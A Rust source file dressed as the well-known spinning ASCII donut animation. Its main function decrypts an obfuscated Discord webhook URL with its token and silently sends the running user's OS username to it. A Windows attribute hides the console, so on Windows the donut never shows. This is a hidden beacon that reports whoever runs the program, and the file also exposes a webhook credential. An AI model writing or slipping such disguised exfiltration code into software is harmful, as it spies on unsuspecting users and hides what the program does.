#![cfg_attr(target_os = "windows", windows_subsystem = "windows")]

use serenity::builder::ExecuteWebhook;
use serenity::http::Http;
use serenity::model::webhook::Webhook;
use std::thread;
use std::time::Duration;
use cryptify;

fn donut() {
    let (mut a, mut b): (f32, f32) = (0.0, 0.0);
    let mut z: [f32; 1760];
    let mut b2: [char; 1760];
    let s: [char; 12] = ['.', ',', '-', '~', ':', ';', '=', '!', '*', '#', '$', '@'];

    print!("\n1b2J");
    loop {
        // alternative: z[0..1760].fill(0.);
        z = [0.0; 1760];
        // alternative: b2[0..1760].fill(' ');
        b2 = [' '; 1760];
        for j in (0..628).step_by(1) {
            for i in (0..628).step_by(1) {
                let float_j = j as f32 / 100.0;
                let float_i = i as f32 / 100.0;

                let sin_i: f32 = float_i.sin();
                let cos_j: f32 = float_j.cos();
                let sin_a: f32 = a.sin();
                let sin_j: f32 = float_j.sin();
                let cos_a: f32 = a.cos();
                let cos_j_2: f32 = cos_j + 2.0;
                let m: f32 = 1.0 / (sin_i * cos_j_2 * sin_a + sin_j * cos_a + 5.0);
                let cos_i: f32 = float_i.cos();
                let cos_b: f32 = b.cos();
                let sin_b: f32 = b.sin();
                let t: f32 = sin_i * cos_j_2 * cos_a - sin_j * sin_a;

                let x: usize = (40.0 + 30.0 * m * (cos_i * cos_j_2 * cos_b - t * sin_b)) as usize;
                let y: usize = (12.0 + 15.0 * m * (cos_i * cos_j_2 * sin_b + t * cos_b)) as usize;
                let o: usize = x + 80 * y;
                let n_m: usize = (8.0
                    * ((sin_j * sin_a - sin_i * cos_j * cos_a) * cos_b
                        - sin_i * cos_j * sin_a
                        - sin_j * cos_a
                        - cos_i * cos_j * sin_b)) as usize;

                if 22 > y && y > 0 && x > 0 && 80 > x && m > z[o] {
                    z[o] = m;
                    b2[o] = s[if n_m > 0 { n_m } else { 0 }];
                }
            }
        }
        print!("\x1b[d");
        for k in (0..1761).step_by(1) {
            print!("{}", if k % 80 != 0 { b2[k] } else { '\n' });
        }
        a += 0.04;
        b += 0.02;

        thread::sleep(Duration::from_millis(5));
    }
}

#[tokio::main]
async fn main() {
    let http = Http::new("");
    let webhook = Webhook::from_url(&http, cryptify::encrypt_string!("https://discord.com/api/webhooks/1329425656647516223/7hkWERa5lejXlK99VWe0H7JrfwzHYW-kwFBORmPAFSjNHpWsSn_zEDh-5_2VHYEH143N").as_str())
        .await
        .expect("Invalid webhook.");

    let builder = ExecuteWebhook::new()
        .content("Ballsack")
        .username(whoami::username())
        .avatar_url(
            cryptify::encrypt_string!("https://cdn.discordapp.com/attachments/936284146416906270/1329436606146412676/pfp.jpg").as_str(),
        );

    webhook
        .execute(&http, false, builder)
        .await
        .expect("Could not run webhook.");

	donut()
}
